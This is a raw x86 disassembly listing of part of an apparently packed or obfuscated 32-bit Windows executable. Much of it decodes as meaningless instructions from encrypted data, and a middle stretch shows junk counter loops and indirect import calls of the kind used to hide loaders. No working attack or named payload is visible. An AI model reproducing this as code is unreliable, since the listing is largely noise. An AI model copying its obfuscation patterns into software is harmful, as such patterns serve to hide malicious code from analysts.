  401815:	xor    DWORD PTR [eax*1+0x7c189da0],eax
  40181c:	cmp    DWORD PTR [ebx-0x76b58613],edx
  401822:	addr16 call 0xf0e0d603
  401828:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401829:	push   cs
  40182a:	dec    ebp
  40182b:	mov    WORD PTR [eax],ds
  40182d:	jo     0x401856
  40182f:	xor    al,dh
  401831:	iret   
  401832:	sahf   
  401833:	shl    BYTE PTR [edi],cl
  401835:	loopne 0x4018a8
  401837:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401838:	add    BYTE PTR [ecx],bh
  40183a:	pusha  
  40183b:	cmp    bl,BYTE PTR [ebp+0x478e694f]
  401841:	xor    BYTE PTR [edx+eiz*4],ah
  401844:	stos   DWORD PTR es:[edi],eax
  401845:	xor    ebp,esp
  401847:	xchg   ebx,eax
  401848:	lahf   
  401849:	(bad)  
  40184a:	out    0x6b,eax
  40184c:	jo     0x40182b
  40184e:	jbe    0x401892
  401850:	and    BYTE PTR [eax],ah
  401852:	mov    DWORD PTR [edx],0x3b5e7547
  401858:	into   
  401859:	xor    DWORD PTR [eax+0x5392a387],esi
  40185f:	xchg   ecx,eax
  401860:	xchg   ebx,eax
  401861:	push   ebp
  401862:	sbb    al,0xa3
  401864:	adc    dl,0xb
  401867:	dec    edx
  401868:	call   0xf3e8:0x2eec8563
  40186f:	mov    dh,0x97
  401871:	out    dx,al
  401872:	into   
  401873:	out    dx,eax
  401874:	shl    DWORD PTR [ebx],1
  401876:	out    dx,eax
  401877:	ret    0xba31
  40187a:	push   es
  40187b:	cs or  eax,0xeadb400c
  401881:	mov    eax,ds:0x5eda6e86
  401886:	and    eax,0xd1a43d3a
  40188b:	cld    
  40188c:	imul   DWORD PTR [edi-0x7b]
  40188f:	sub    al,0x6a
  401891:	test   BYTE PTR [edi],ch
  401893:	cmp    bh,bl
  401895:	or     DWORD PTR [ebp+0x2b8a4a89],edi
  40189b:	mov    bh,bh
  40189d:	leave  
  40189e:	retf   
  40189f:	in     al,dx
  4018a0:	sub    eax,edx
  4018a2:	or     esi,DWORD PTR [ebx-0x76]
  4018a5:	cmp    DWORD PTR [eax],0xffffffdf
  4018a8:	cdq    
  4018a9:	push   esp
  4018aa:	mov    DWORD PTR [edx-0x6aaae688],0xc38f4c4e
  4018b4:	mov    WORD PTR [ecx+0x4e],?
  4018b7:	adc    eax,0xdcbca050
  4018bc:	pusha  
  4018bd:	cmp    eax,0x2581c703
  4018c2:	aaa    
  4018c3:	aaa    
  4018c4:	inc    ebx
  4018c5:	add    BYTE PTR [eax],al
  4018c7:	add    BYTE PTR [eax],al
  4018c9:	add    cl,ch
  4018cb:	or     eax,0x8b000000
  4018d0:	sbb    eax,0x433737
  4018d5:	inc    ebx
  4018d6:	mov    DWORD PTR ds:0x433737,ebx
  4018dc:	cmp    DWORD PTR ds:0x433737,0x1c
  4018e3:	jae    0x401910
  4018e9:	cmp    DWORD PTR ds:0x433737,0x23
  4018f0:	jne    0x401901
  4018f6:	push   0x6ff2
  4018fb:	call   DWORD PTR ds:0x41228c
  401901:	jmp    0x4018cf
  401906:	mov    DWORD PTR ds:0x43372b,0x436b
  401910:	mov    DWORD PTR [ebp-0x38],eax
  401913:	mov    DWORD PTR [ebp-0x44],0xf89cb531
  40191a:	mov    DWORD PTR [ebp-0x54],0xf89f0531
  401921:	or     DWORD PTR ds:0x433677,edx
  401927:	mov    DWORD PTR [ebp-0x4c],0xf89c85f1
  40192e:	add    eax,DWORD PTR ds:0x43366b
  401934:	mov    DWORD PTR [ebp-0x3c],0xf89c85d1
  40193b:	xor    DWORD PTR ds:0x43372f,ecx
  401941:	mov    eax,DWORD PTR [ebp-0x10]
  401944:	xor    ebx,DWORD PTR ds:0x4336f3
  40194a:	xor    eax,esi
  40194c:	add    eax,edi
  40194e:	mov    DWORD PTR [ebp-0xc],eax
  401951:	mov    DWORD PTR [ebp-0x28],0xf89c853e
  401958:	sbb    ebx,ebx
  40195a:	mov    BYTE PTR [ebp-0x11],0x67
  40195e:	sub    DWORD PTR ds:0x433667,0x1011
  401968:	mov    eax,DWORD PTR [ebp-0x10]
  40196b:	xor    eax,esi
  40196d:	add    eax,edi
  40196f:	sbb    DWORD PTR ds:0x433633,0x6b1e
  401979:	mov    DWORD PTR [ebp-0xc],eax
  40197c:	mov    eax,DWORD PTR [ebp-0x3c]
  40197f:	xor    eax,esi
  401981:	xor    DWORD PTR ds:0x43366f,0x46ad
  40198b:	add    eax,edi
  40198d:	mov    DWORD PTR [ebp-0x34],eax
  401990:	mov    eax,DWORD PTR [ebp-0x44]
  401993:	mov    DWORD PTR ds:0x433667,0x12
  40199d:	cmp    DWORD PTR ds:0x433667,0x0
  4019a4:	je     0x4019f8
  4019aa:	cmp    DWORD PTR ds:0x433667,0x7
  4019b1:	jne    0x4019c2
  4019b7:	push   0x433767
  4019bc:	call   DWORD PTR ds:0x4121b8
  4019c2:	cmp    DWORD PTR ds:0x433667,0x8
  4019c9:	jne    0x4019dc
  4019cf:	mov    ebx,DWORD PTR ds:0x433667
  4019d5:	dec    ebx
  4019d6:	mov    DWORD PTR ds:0x433667,ebx
  4019dc:	mov    ebx,DWORD PTR ds:0x433667
  4019e2:	dec    ebx
  4019e3:	mov    DWORD PTR ds:0x433667,ebx
  4019e9:	jmp    0x40199d
  4019ee:	and    DWORD PTR ds:0x433613,0x446b
  4019f8:	xor    eax,esi
  4019fa:	add    eax,edi
  4019fc:	not    ebx
  4019fe:	mov    DWORD PTR [ebp-0x30],eax
  401a01:	sub    ebx,DWORD PTR ds:0x4336f7
  401a07:	mov    eax,DWORD PTR [ebp-0x28]
  401a0a:	add    ecx,ecx
  401a0c:	xor    eax,esi
  401a0e:	and    DWORD PTR ds:0x4336eb,0x0
  401a18:	jmp    0x401a2a
  401a1d:	mov    ebx,DWORD PTR ds:0x4336eb
  401a23:	inc    ebx
  401a24:	mov    DWORD PTR ds:0x4336eb,ebx
  401a2a:	cmp    DWORD PTR ds:0x4336eb,0x18
  401a31:	jae    0x401f27
  401a37:	cmp    DWORD PTR ds:0x4336eb,0xa
  401a3e:	jne    0x401a4f
  401a44:	push   0x1a57
  401a49:	call   DWORD PTR ds:0x412350
  401a4f:	cmp    DWORD PTR ds:0x4336eb,0x9
  401a56:	jne    0x401a6b
  401a5c:	xor    ebx,ebx
  401a5e:	xor    ebx,DWORD PTR ds:0x4336eb
  401a64:	inc    ebx
  401a65:	mov    DWORD PTR ds:0x4336eb,ebx
  401a6b:	jmp    0x401a1d
  401a70:	mov    DWORD PTR ds:0x433617,0x13
  401a7a:	cmp    DWORD PTR ds:0x433617,0x0
  401a81:	je     0x401f27
  401a87:	cmp    DWORD PTR ds:0x433617,0xa
  401a8e:	jne    0x401a9f
  401a94:	push   0x764e
  401a99:	call   DWORD PTR ds:0x412290
  401a9f:	cmp    DWORD PTR ds:0x433617,0xb
  401aa6:	jne    0x401abb
  401aac:	xor    ecx,ecx
  401aae:	xor    ecx,DWORD PTR ds:0x433617
  401ab4:	dec    ecx
  401ab5:	mov    DWORD PTR ds:0x433617,ecx
  401abb:	mov    ecx,DWORD PTR ds:0x433617
  401ac1:	dec    ecx
  401ac2:	mov    DWORD PTR ds:0x433617,ecx
  401ac8:	jmp    0x401a7a
  401acd:	and    DWORD PTR ds:0x433677,0x0
  401ad7:	jmp    0x401ae9
  401adc:	mov    ecx,DWORD PTR ds:0x433677
  401ae2:	inc    ecx
  401ae3:	mov    DWORD PTR ds:0x433677,ecx
  401ae9:	cmp    DWORD PTR ds:0x433677,0x1c
  401af0:	jae    0x401f27
  401af6:	cmp    DWORD PTR ds:0x433677,0x1d
  401afd:	jne    0x401b0e
  401b03:	push   0x3c99
  401b08:	call   DWORD PTR ds:0x412294
  401b0e:	jmp    0x401adc
  401b13:	xor    DWORD PTR ds:0x433677,ecx
  401b19:	jmp    0x401f27
  401b1e:	mov    cl,0x40
  401b20:	(bad)  
  401b21:	mul    DWORD PTR es:[ecx+0x73ea5171]
  401b28:	cmp    edx,DWORD PTR [ebx+0x29]
  401b2b:	cmp    ah,bl
  401b2d:	jg     0x401b8b
  401b2f:	jns    0x401baf
  401b31:	jle    0x401ba2
  401b33:	jge    0x401bb3
  401b35:	jle    0x401abf
  401b37:	lods   eax,DWORD PTR ds:[esi]
  401b38:	call   0xd5652473
  401b3d:	jge    0x401b68
  401b3f:	lods   eax,DWORD PTR ds:[esi]
  401b40:	dec    ebp
  401b41:	mov    ss,WORD PTR [edi]
  401b43:	add    al,0x6e
  401b45:	jmp    0x401aec
  401b47:	(bad)  
  401b4a:	arpl   cx,cx
  401b4c:	js     0x401b65
  401b4e:	pushf  
  401b4f:	add    dh,al
  401b51:	faddp  st(1),st
  401b53:	fwait
  401b54:	mov    cs,WORD PTR [esi-0xd]
  401b57:	adc    BYTE PTR [edi+eiz*2+0xe],cl
  401b5b:	or     edx,esi
  401b5d:	cld    
  401b5e:	xchg   edi,eax
  401b5f:	mov    esi,0xa71d3afc
  401b64:	inc    esp
  401b65:	sti    
  401b66:	fistp  WORD PTR [edx]
  401b68:	dec    edx
  401b69:	rol    al,cl
  401b6b:	xchg   ecx,eax
  401b6c:	icebp  
  401b6d:	mov    eax,0x695f5bc
  401b72:	int3   
  401b73:	jb     0x401b50
  401b75:	push   ebx
  401b76:	mov    ah,BYTE PTR [edx+edx*1+0x30a44c94]
  401b7d:	aas    
  401b7e:	add    DWORD PTR [ecx+0x5f],esp
  401b81:	popf   
  401b82:	sahf   
  401b83:	sbb    eax,DWORD PTR [ebx-0x2f]
  401b86:	lods   eax,DWORD PTR ds:[esi]
  401b88:	int3   
  401b89:	jle    0x401b12
  401b8b:	stc    
  401b8c:	scas   eax,DWORD PTR es:[edi]
  401b8d:	sbb    BYTE PTR [edi+edi*8-0x62986fe],dh
  401b94:	data16 mov WORD PTR [ecx+0x199b5b6e],ds
  401b9b:	sbb    eax,0xfefc24b4
  401ba0:	add    eax,0xd543ef91
  401ba5:	nop
  401ba6:	fwait
  401ba7:	(bad)  
  401ba8:	and    eax,0xa2715602
  401bad:	out    0xb0,al
  401baf:	push   esp
  401bb0:	test   ebp,ebp
  401bb2:	icebp  
  401bb3:	scas   al,BYTE PTR es:[edi]
  401bb4:	dec    edx
  401bb5:	or     eax,0x101f5733
  401bba:	cmp    DWORD PTR [ebx-0x44025507],ebp
  401bc0:	out    dx,al
  401bc1:	jl     0x401c2a
  401bc3:	pop    ecx
  401bc4:	pop    ebp
  401bc5:	enter  0x8f9d,0x39
  401bc9:	xchg   esp,eax
  401bca:	test   esp,esp
  401bcc:	mov    ds:0xd1622eb3,eax
  401bd1:	and    BYTE PTR [ebx],ch
  401bd3:	dec    edx
  401bd4:	adc    edi,edx
  401bd6:	cmp    BYTE PTR [eax],dh
  401bd8:	test   BYTE PTR [esi+0x7a],bh
  401bdb:	cdq    
  401bdc:	cmc    
  401bdd:	ja     0x401bff
  401bdf:	je     0x401b93
  401be1:	addr16 neg ebx
  401be4:	fld    QWORD PTR [ecx-0x17fcf6d3]
  401bea:	std    
  401beb:	mov    edi,0x3262917d
  401bf0:	jae    0x401bb4
  401bf2:	ffree  st(0)
  401bf4:	dec    eax
  401bf5:	clc    
  401bf6:	sub    edi,DWORD PTR [edx+0x76]
  401bf9:	hlt    
  401bfa:	push   ss
  401bfb:	inc    eax
  401bfc:	fcomp  DWORD PTR [eax+0x3f]
  401bff:	xor    ebp,DWORD PTR [edx+esi*4-0x27440078]
  401c06:	inc    edi
  401c07:	(bad)  
  401c08:	ja     0x401b8e
  401c0a:	or     DWORD PTR [esi-0xc618624],ecx
  401c10:	and    bl,BYTE PTR [ecx-0x2bf124b4]
  401c16:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401c17:	xchg   ebp,edx
  401c19:	aad    0x20
  401c1b:	cmp    BYTE PTR [ebx+ebp*4+0x46ce88ec],dh
  401c22:	ds std 
  401c24:	ins    DWORD PTR es:[edi],dx
  401c25:	das    
  401c26:	rcl    BYTE PTR [edx],cl
  401c28:	lock je 0x401c25
  401c2b:	cwde   
  401c2c:	fisttp QWORD PTR [edi-0x3e]
  401c2f:	jb     0x401c2a
  401c31:	dec    eax
  401c32:	pop    edx
  401c33:	(bad)  
  401c34:	icebp  
  401c35:	mov    al,ds:0xbde4eb9f
  401c3a:	mov    dh,0x88
  401c3c:	mov    ch,0xe3
  401c3e:	xor    eax,0xe20a2311
  401c43:	hlt    
  401c44:	jl     0x401c03
  401c46:	push   ebp
  401c47:	inc    esp
  401c48:	jbe    0x401c83
  401c4a:	add    DWORD PTR [edi-0x23430249],ebp
  401c50:	mov    cl,0xf8
  401c52:	lods   eax,DWORD PTR ds:[esi]
  401c53:	sub    cl,BYTE PTR ss:[ecx]
  401c56:	lds    edi,FWORD PTR [eax]
  401c58:	(bad)  
  401c59:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401c5a:	outs   dx,DWORD PTR ds:[esi]
  401c5b:	adc    al,BYTE PTR [edi+0x30014d51]
  401c61:	fwait
  401c62:	nop
  401c63:	xor    cl,dh
  401c65:	dec    ebx
  401c66:	fst    DWORD PTR [edx]
  401c68:	es ins DWORD PTR es:[edi],dx
  401c6a:	mov    cl,al
  401c6c:	and    eax,0x7c68ee75
  401c71:	int3   
  401c72:	mov    bh,0xe0
  401c74:	aam    0x20
  401c76:	cmp    BYTE PTR [ecx],ah
  401c78:	js     0x401c36
  401c7a:	rcl    DWORD PTR [edi],0xd4
  401c7d:	mov    ecx,ds
  401c7f:	fld    DWORD PTR [ecx+0xe]
  401c82:	xor    BYTE PTR [esi+esi*2],bl
  401c85:	push   edx
  401c86:	popf   
  401c87:	mov    edi,0x119bf487
  401c8c:	std    
  401c8d:	xchg   esi,eax
  401c8e:	sub    eax,esp
  401c90:	jo     0x401cf1
  401c92:	sub    bh,0x65
  401c95:	cmp    DWORD PTR [edx-0x69afc1e7],eax
  401c9b:	es sub al,0x40
  401c9e:	add    DWORD PTR [edx+0x3e],0xffffffca
  401ca2:	gs data16 in al,0xf1
  401ca6:	mov    ds:0x5ed63e1c,eax
  401cab:	shl    DWORD PTR [eax+0x1207f89d],cl
  401cb1:	lods   eax,DWORD PTR ds:[esi]
  401cb2:	(bad)  
  401cb3:	push   ds
  401cb4:	rcl    DWORD PTR [edi+edx*8-0x45dc17d1],0xf9
  401cbc:	or     dl,BYTE PTR [ebp-0x1762aece]
  401cc2:	cmp    bh,BYTE PTR [eax]
  401cc4:	retf   0xc94b
  401cc7:	add    cl,bl
  401cc9:	divps  xmm6,XMMWORD PTR [esi-0x2088ed73]
  401cd0:	pop    eax
  401cd1:	retf   
  401cd2:	xchg   ecx,ebp
  401cd4:	test   al,0x3f
  401cd6:	add    ch,cl
  401cd8:	jl     0x401c64
  401cda:	cdq    
  401cdb:	push   es
  401cdc:	mov    al,ds:0xb0e8b013
  401ce1:	stc    
  401ce2:	idiv   cl
  401ce4:	(bad)  
  401ce5:	int3   
  401ce6:	shl    cl,1
  401ce8:	scas   al,BYTE PTR es:[edi]
  401ce9:	add    ecx,DWORD PTR [ebp+0x3109bf11]
  401cef:	xor    ecx,DWORD PTR [ebp+0x19214e71]
  401cf5:	xchg   esp,eax
  401cf6:	sub    al,0x97
  401cf8:	jp     0x401c9f
  401cfa:	xchg   esp,eax
  401cfb:	cmc    
  401cfc:	(bad)
  401d01:	jno    0x401c86
  401d03:	es pop ebx
  401d05:	lods   eax,DWORD PTR ds:[esi]
  401d06:	sbb    eax,0x77fde7ff
  401d0b:	adc    eax,0x548492e
  401d10:	movaps xmm3,XMMWORD PTR [edi]
  401d13:	add    BYTE PTR [esi+0x7134b9],dh
  401d19:	ret    
  401d1a:	ja     0x401d2a
  401d1c:	bound  edx,QWORD PTR [ebp-0x34]
  401d1f:	push   cs
  401d20:	lods   al,BYTE PTR ds:[esi]
  401d21:	or     DWORD PTR [edi-0x2c],ebp
  401d24:	scas   eax,DWORD PTR es:[edi]
  401d25:	inc    edx
  401d26:	hlt    
  401d27:	push   eax
  401d28:	jno    0x401d42
  401d2a:	jle    0x401d76
  401d2c:	xchg   BYTE PTR [ecx-0x872f91f],dl
  401d32:	xchg   esp,eax
  401d33:	add    al,0x26
  401d35:	inc    esi
  401d36:	(bad)  
  401d37:	lods   eax,DWORD PTR ds:[esi]
  401d38:	jp     0x401cbb
  401d3a:	push   es
  401d3b:	fcmovu st,st(7)
  401d3d:	int3   
  401d3e:	add    edi,0x38d4d126
  401d44:	lods   eax,DWORD PTR ds:[esi]
  401d45:	sbb    edx,DWORD PTR [edx-0x4bcc7f9f]
  401d4b:	test   al,0x6
  401d4d:	cmp    BYTE PTR [edi+eax*1],bh
  401d50:	scas   al,BYTE PTR es:[edi]
  401d51:	cmp    ebp,DWORD PTR [edx+edx*8+0x2]
  401d55:	mov    esi,0xecd1d872
  401d5a:	sahf   
  401d5b:	mov    ah,0x8a
  401d5d:	not    BYTE PTR [ebx-0x39d2af48]
  401d63:	add    DWORD PTR [edi],edx
  401d65:	nop
  401d66:	fwait
  401d67:	ins    BYTE PTR es:[edi],dx
  401d68:	add    eax,0x6c809c60
  401d6d:	js     0x401d67
  401d6f:	pop    ebx
  401d70:	xor    dh,ah
  401d72:	mov    ah,bh
  401d74:	mov    eax,ds:0x1ab90fe5
  401d79:	adc    al,0xab
  401d7b:	mov    ah,ah
  401d7d:	lea    edi,[edi]
  401d7f:	sahf   
  401d80:	gs (bad) 
  401d82:	cwde   
  401d83:	xor    bl,ah
  401d85:	add    al,0xfd
  401d87:	(bad)  
  401d88:	iret   
  401d89:	or     al,0xa6
  401d8b:	enter  0xfaa4,0xec
  401d8f:	xor    edi,DWORD PTR [esi-0x658cb083]
  401d95:	inc    esp
  401d96:	push   esi
  401d97:	jl     0x401dc8
  401d99:	mov    ds:0xf160a1c0,al
  401d9e:	xor    ebx,ecx
  401da0:	jnp    0x401d5d
  401da2:	adc    eax,0x89090b13
  401da7:	mov    WORD PTR [edi-0x4a],?
  401daa:	xor    al,0x21
  401dac:	sbb    BYTE PTR [ecx+0x2c],0x83
  401db0:	mov    cl,0x87
  401db2:	cmc    
  401db3:	test   BYTE PTR [ebx],ah
  401db5:	je     0x401d99
  401db7:	jmp    FWORD PTR [eax]
  401db9:	adc    eax,0xde57dcdb
  401dbe:	repnz mov ss,edi
  401dc1:	mov    ch,0x34
  401dc3:	(bad)  
  401dc4:	jmp    0x2ceb:0xbe65ad91
  401dcb:	adc    al,0xa1
  401dcd:	call   0x14f5d9a7
  401dd2:	xchg   DWORD PTR [di-0xf],edx
  401dd6:	mov    esp,0xab5ad0b3
  401ddb:	data16 cmp BYTE PTR [ebp-0x3c],ch
  401ddf:	mov    al,ds:0x93ade459
  401de4:	jl     0x401e15
  401de6:	ficomp WORD PTR [edx+esi*8+0x10]
  401dea:	dec    edi
  401deb:	adc    al,0x18
  401ded:	jecxz  0x401dc7
  401def:	clc    
  401df0:	xlat   BYTE PTR ds:[ebx]
  401df1:	pop    esp
  401df2:	xor    BYTE PTR [edi+0x61],bl
  401df5:	mul    DWORD PTR [edx-0x4]
  401df8:	fcomp  QWORD PTR ds:0x43ec70
  401dfe:	mov    edi,0x5fb14064
  401e03:	xchg   edi,eax
  401e04:	repz icebp 
  401e06:	(bad)
  401e09:	aaa    
  401e0a:	mov    bh,BYTE PTR [edi]
  401e0c:	jecxz  0x401dd2
  401e0e:	int    0xca
  401e10:	mov    dl,0xc8
  401e12:	sbb    eax,0x8009bd55
  401e17:	inc    esp
  401e18:	ss repnz push esi
  401e1b:	(bad)  
  401e1c:	retf   0x7f3e
  401e1f:	dec    eax
  401e20:	dec    ebx
  401e21:	bound  eax,QWORD PTR [ebx-0x3e963142]
  401e27:	mov    es,WORD PTR [ecx-0x69298813]
  401e2d:	jnp    0x401e9c
  401e2f:	mov    ecx,0x587ef0bf
  401e34:	jno    0x401e12
  401e36:	mov    edi,0x431a4b81
  401e3b:	push   cs
  401e3c:	inc    eax
  401e3d:	out    dx,eax
  401e3e:	pop    esp
  401e3f:	mov    ah,0x68
  401e41:	xor    al,0x2d
  401e43:	jp     0x401e8f
  401e45:	dec    eax
  401e46:	(bad)  
  401e47:	mov    edi,0x3b68db6c
  401e4c:	push   ebp
  401e4d:	add    ah,BYTE PTR [ecx-0x370d5cce]
  401e53:	xor    cl,BYTE PTR [ebx+0x6a5a7ad7]
  401e59:	loopne 0x401eaa
  401e5b:	mov    eax,0x4f267154
  401e60:	jmp    0x7cafcfdf
  401e65:	fcomp  DWORD PTR [esi+0x6e]
  401e68:	cmp    al,0x17
  401e6b:	push   ss
  401e6c:	pop    ss
  401e6d:	xor    esi,DWORD PTR [ecx+0x16]
  401e70:	aaa    
  401e71:	cli    
  401e72:	pop    ecx
  401e73:	mov    al,ds:0x5eec7586
  401e78:	jb     0x401e88
  401e7a:	mov    ds:0x52432ca2,al
  401e7f:	mov    al,ds:0xbdda1596
  401e84:	ins    BYTE PTR es:[edi],dx
  401e85:	fld    TBYTE PTR ds:0xbe7ad9a1
  401e8b:	mov    BYTE PTR [ebp+0x61],bh
  401e8e:	btr    DWORD PTR [esi+0x29],esp
  401e92:	xchg   ebp,eax
  401e93:	in     eax,0x12
  401e95:	scas   eax,DWORD PTR es:[edi]
  401e96:	(bad)  
  401e97:	shr    DWORD PTR [ebx],0xd3
  401e9a:	js     0x401e46
  401e9c:	ins    DWORD PTR es:[edi],dx
  401e9d:	pop    esi
  401e9e:	xor    BYTE PTR [ebp-0x13a366ce],ah
  401ea4:	jae    0x401e43
  401ea6:	add    al,0x49
  401ea8:	xor    al,0x9a
  401eaa:	xchg   edi,eax
  401eab:	and    DWORD PTR [edx-0x6f],0xd710accc
  401eb2:	push   eax
  401eb3:	sub    BYTE PTR [esi-0x5f194a03],bl
  401eb9:	jmp    0x9b7e5552
  401ebe:	mov    al,ds:0x354106a9
  401ec3:	dec    eax
  401ec4:	std    
  401ec5:	cld    
  401ec6:	(bad)  
  401ec7:	rcr    al,cl
  401ec9:	and    DWORD PTR [eax+0x376503ab],eax
  401ecf:	push   ebp
  401ed0:	add    edi,DWORD PTR [esi+0x56]
  401ed3:	mov    eax,ds:0x42b15405
  401ed8:	loopne 0x401eab
  401eda:	sub    ebp,ebx
  401edc:	dec    edi
  401edd:	xlat   BYTE PTR ds:[ebx]
  401ede:	test   eax,0xc62e64ae
  401ee3:	xchg   esi,eax
  401ee4:	jb     0x401ed4
  401ee6:	pop    eax
  401ee7:	in     al,dx
  401ee8:	and    cl,BYTE PTR [edx-0x100776cb]
  401eee:	inc    esp
  401ef0:	(bad)  
  401ef1:	jl     0x401f41
  401ef3:	dec    edi
  401ef4:	sbb    BYTE PTR [esi],bl
  401ef6:	adc    edi,esi
  401ef8:	ss push ds
  401efa:	ja     0x401eb6
  401efc:	mov    cl,0x63
  401efe:	data16 loope 0x401eba
  401f01:	mov    BYTE PTR [edx-0x41],bh
  401f04:	or     BYTE PTR [edi+0x4a],0xf9
  401f08:	in     al,0xa
  401f0a:	icebp  
  401f0b:	mov    ebx,0xffde6892
  401f10:	or     al,BYTE PTR [esi]
  401f12:	int    0x9d
  401f14:	mov    ds:0x1a4cc15d,al
  401f19:	nop
  401f1a:	lahf   
  401f1b:	push   ecx
  401f1c:	jo     0x401f5c
  401f1e:	je     0x401f16
  401f20:	mov    esi,0x4c694019
  401f25:	into   
  401f26:	fadd   DWORD PTR [ebx]
  401f28:	(bad)  
  401f29:	mov    ebx,DWORD PTR ds:0x43370b
  401f2f:	mov    ecx,DWORD PTR ds:0x433757
  401f35:	sub    ecx,ebx
  401f37:	add    ebx,DWORD PTR [ebx+ecx*1]
  401f3a:	mov    DWORD PTR [ebp-0x2c],eax
  401f3d:	mov    ebx,DWORD PTR ds:0x433747
  401f43:	mov    ebx,DWORD PTR [ebx]
  401f45:	xor    DWORD PTR ds:0x43361b,ebx
  401f4b:	jmp    0x402359
  401f50:	lahf   
  401f51:	in     al,dx
  401f52:	leave  
  401f53:	dec    DWORD PTR [ecx-0x65]
  401f56:	imul   ebp,esp,0xaa49c393
  401f5c:	je     0x401f24
  401f5e:	inc    edi
  401f5f:	jle    0x401fae
  401f61:	add    eax,0x7d6f7e7e
  401f66:	jle    0x401fe6
  401f68:	jl     0x401f71
  401f6a:	aas    
  401f6b:	in     eax,dx
  401f6c:	or     ebx,DWORD PTR ds:0x837f6c62
  401f72:	mov    ecx,0x7fdc8ab5
  401f77:	retf   
  401f78:	sbb    DWORD PTR [edx-0x21f77b1c],eax
  401f7e:	loopne 0x401f86
  401f80:	mov    edx,0x531be79f
  401f85:	push   ss
  401f86:	xchg   ebx,eax
  401f87:	loope  0x401f3d
  401f89:	mov    edx,ecx
  401f8b:	mov    ebp,0x58243846
  401f90:	inc    ebx
  401f91:	mov    eax,0xb9f1980d
  401f96:	inc    eax
  401f97:	mov    edi,0xfdd90f97
  401f9c:	int3   
  401f9d:	push   0x56644546
  401fa2:	mov    esp,0xe70ad63c
  401fa7:	neg    BYTE PTR [edi]
  401fa9:	stos   DWORD PTR es:[edi],eax
  401faa:	sbb    BYTE PTR [ecx+0x54],dh
  401fad:	rcl    ch,cl
  401faf:	(bad)  
  401fb0:	test   eax,0x27de0670
  401fb5:	mov    ss,WORD PTR [edi+0x7]
  401fb8:	push   ebx
  401fb9:	xchg   esp,eax
  401fba:	and    eax,0xda12c388
  401fbf:	int    0x5a
  401fc1:	out    dx,eax
  401fc2:	int3   
  401fc3:	mov    ah,0xfe
  401fc5:	xor    al,0x89
  401fc7:	das    
  401fc8:	pop    ecx
  401fc9:	je     0x401f69
  401fcb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401fcc:	jp     0x401ff7
  401fce:	jno    0x401fab
  401fd0:	in     al,dx
  401fd1:	mov    esp,0xbf60ff1b
  401fd6:	mov    WORD PTR [ecx],es
  401fd8:	dec    esi
  401fd9:	jmp    0xabeffe3e
  401fde:	xchg   ebx,eax
  401fdf:	mov    esp,0x23322788
  401fe4:	repz xchg ebp,eax
  401fe6:	sbb    al,0x6d
  401fe8:	cli    
  401fe9:	lods   al,BYTE PTR ds:[esi]
  401fea:	mov    al,0x99
  401fec:	add    bl,BYTE PTR [edi-0x5893d864]
  401ff2:	mov    bl,0xa0
  401ff4:	(bad)  
  401ff5:	cmovae ecx,DWORD PTR [edi+0x75]
  401ff9:	lahf   
  401ffa:	push   ss
  401ffb:	cmp    BYTE PTR [edx],ah
  401ffd:	sub    eax,0xbfb7f7b9
  402002:	ret    
  402003:	out    dx,eax
  402004:	inc    edi
  402005:	dec    esp
  402006:	mov    ebx,0x1b0cc3e7
  40200b:	adc    eax,0x67161d69
  402010:	jg     0x401fdc
  402012:	add    BYTE PTR [eax-0xac1dcd8],ah
  402018:	dec    edx
  402019:	or     eax,DWORD PTR [ebp+0x65100975]
  40201f:	imul   DWORD PTR [ebx]
  402021:	or     bl,BYTE PTR [eax-0x34]
  402024:	dec    esp
  402025:	mov    bl,0x41
  402027:	jecxz  0x40207e
  402029:	xor    esi,DWORD PTR [eax-0x64]
  40202c:	test   eax,0xe2adb04d
  402031:	in     eax,dx
  402032:	lahf   
  402033:	ss mov edx,0x12a74aef
  402039:	inc    ecx
  40203a:	pop    esp
  40203b:	pushf  
  40203c:	xchg   ecx,eax
  40203d:	pop    ecx
  40203e:	jg     0x402087
  402040:	mov    ebp,0xe1682553
  402045:	rep lods al,BYTE PTR ds:[esi]
  402047:	cmp    eax,0x49f2e62d
  40204c:	jnp    0x401fd6
  40204e:	push   ds
  40204f:	iret   
  402050:	dec    ebp
  402051:	pop    ds
  402052:	daa    
  402053:	dec    ebp
  402054:	ds fwait
  402056:	sbb    edi,DWORD PTR [ecx]
  402058:	call   0x495c:0xec9c3d2d
  40205f:	add    ebp,DWORD PTR [esi]
  402061:	or     DWORD PTR [edi+0x6e5a10ba],edi
  402067:	mov    edx,0xc23ee96c
  40206c:	cmp    BYTE PTR [ecx-0x3],ah
  40206f:	dec    esi
  402070:	shl    BYTE PTR [eax],1
  402072:	xchg   BYTE PTR [ebx],ch
  402074:	xchg   BYTE PTR [esi],dh
  402076:	bsr    ebx,esp
  402079:	pop    ebp
  40207a:	push   ebp
  40207b:	mov    ah,0x80
  40207d:	xchg   esi,eax
  40207e:	fbstp  TBYTE PTR [edx]
  402080:	add    DWORD PTR [edx+eax*1+0x5],edx
  402084:	mov    ch,0xdf
  402086:	(bad)  
  402087:	pop    eax
  402088:	sub    BYTE PTR [ecx+0x4d],0xa
  40208c:	jmp    0x7f56b488
  402091:	int    0xe6
  402093:	test   al,0xc1
  402095:	push   edx
  402096:	pop    esp
  402097:	and    DWORD PTR [edi-0x2c],edx
  40209a:	div    DWORD PTR [ecx-0x38a6c029]
  4020a0:	fbstp  TBYTE PTR [edx+0x2]
  4020a3:	push   esp
  4020a4:	test   eax,0x93ce0f24
  4020a9:	dec    esi
  4020aa:	xchg   BYTE PTR [ecx],dh
  4020ac:	mov    cs,WORD PTR [ecx+0x2e7697d6]
  4020b2:	jno    0x4020de
  4020b4:	fwait
  4020b5:	das    
  4020b6:	sbb    eax,0x632ad53a
  4020bb:	mov    BYTE PTR [esi],bh
  4020bd:	outs   dx,DWORD PTR ds:[esi]
  4020be:	fucomi st,st(4)
  4020c0:	lahf   
  4020c1:	ds sbb al,0x5c
  4020c4:	xchg   ebp,eax
  4020c5:	pop    es
  4020c6:	dec    ebp
  4020c7:	scas   eax,DWORD PTR es:[edi]
  4020c8:	push   0x867bb396
  4020cd:	mov    cl,0x8a
  4020cf:	ja     0x402091
  4020d1:	pop    es
  4020d2:	mov    cl,0x8d
  4020d4:	ss pop es
  4020d6:	in     eax,0x2d
